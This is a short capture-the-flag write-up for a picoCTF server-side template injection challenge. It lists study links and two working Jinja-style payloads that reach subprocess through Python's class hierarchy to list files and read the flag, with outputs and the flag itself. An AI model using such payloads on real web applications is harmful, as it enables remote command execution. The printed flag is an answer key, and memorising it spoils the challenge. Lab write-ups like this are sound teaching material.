## Challenge instance &rarr; https://play.picoctf.org/practice/challenge/492

***
### Study materials and resources;
- [YouTube video](https://www.youtube.com/watch?v=4Pv-uyjX21I)
- [PortSwigger article on SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [Payloads on GitHub](https://github.com/payloadbox/ssti-payloads).


**Server Command: `{{''.__class__.__mro__[1].__subclasses__()[356](['ls'],stdout=-1).communicate()}}`**

**Output: `(b'__pycache__\napp.py\nflag\nrequirements.txt\n', None)`**

**Server Command: `{{''.__class__.__mro__[1].__subclasses__()[356](['cat','flag'],stdout=-1).communicate()}}`**

**Output: `(b'picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}', None)`**
***